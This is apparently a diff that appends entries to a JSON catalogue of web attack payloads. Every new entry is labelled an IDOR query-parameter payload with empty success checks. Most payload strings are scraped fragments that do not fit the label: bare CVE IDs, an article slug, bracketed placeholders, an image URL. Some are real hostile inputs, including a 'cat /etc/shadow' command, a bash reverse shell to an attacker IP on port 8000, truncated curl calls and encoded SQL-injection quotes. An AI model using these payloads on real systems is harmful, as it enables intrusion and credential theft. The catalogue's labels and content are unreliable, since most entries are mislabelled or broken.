@@ -317,5 +317,258 @@
       "expected_status_code": 200,
       "success_regex": "\"email\"|\"role\""
     }
+  },
+  {
+    "payload_id": "OWP-56738",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "CGI",
+    "injection_point": "query_parameter",
+    "payload_string": "[session-id]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56739",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "CGI",
+    "injection_point": "query_parameter",
+    "payload_string": "[email-address]).",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56955",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "articles/2019/12/13/zero-day-vulnerability-deutsche-bahn-ticket-machine-series-system-uncovered",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56958",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2017-6896",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57044",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"cat /etc/shadow\\n\\r\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57348",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Java",
+    "injection_point": "query_parameter",
+    "payload_string": "\"curl -i -s -k  -X $'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57349",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Java",
+    "injection_point": "query_parameter",
+    "payload_string": "\"curl -i -s -k -X $'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57416",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"bash -i >& /dev/tcp/[Attacker-IP]/8000 0>&1\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57531",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2020-14945",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57809",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "SpagoBI-ForresterWave-July2012",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58679",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "[change",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59091",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "u[ID]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59092",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "[album",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59093",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "no[/img]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59472",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "https://cdn.auth0.com/avatars/te.png",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59919",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "none_Admin\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-60203",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2025-47226",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62720",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "%2527,%20username%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62721",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "%2527,%20is_moderator%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62722",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "{cms.file}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63016",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2010-4332",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63017",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2010-4333",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64795",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "UPCP-options",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
